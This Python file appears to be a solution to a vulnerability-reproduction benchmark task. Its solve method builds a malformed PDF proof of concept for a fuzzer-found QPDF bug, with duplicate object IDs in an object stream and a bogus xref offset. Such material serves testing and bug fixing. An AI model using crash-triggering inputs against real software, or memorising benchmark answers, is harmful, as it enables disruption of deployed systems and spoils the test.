import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        pdf = (
            "%PDF-1.5\n"
            "%QPDF PoC for oss-fuzz-42535152\n"
            "1 0 obj\n"
            "<< /Type /Catalog /Pages 2 0 R >>\n"
            "endobj\n"
            "2 0 obj\n"
            "<< /Type /Pages /Count 1 /Kids [3 0 R] >>\n"
            "endobj\n"
            "3 0 obj\n"
            "<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\n"
            "endobj\n"
            "4 0 obj\n"
            "<< /Length 11 >>\n"
            "stream\n"
            "Hello World\n"
            "endstream\n"
            "endobj\n"
            "10 0 obj\n"
            "<< /Type /ObjStm /N 3 /First 14 /Length 73 >>\n"
            "stream\n"
            "5 0 6 20 5 39\n"
            "<< /Duplicated 1 >>\n"
            "<< /ObjectSix 1 >>\n"
            "<< /Duplicated 2 >>\n"
            "endstream\n"
            "endobj\n"
            "5 0 obj\n"
            "<< /Duplicated 0 /Other 11 0 R >>\n"
            "endobj\n"
            "11 0 obj\n"
            "<< /Info (dummy) >>\n"
            "endobj\n"
            "startxref\n"
            "0\n"
            "%%EOF\n"
        )
        return pdf.encode("ascii")
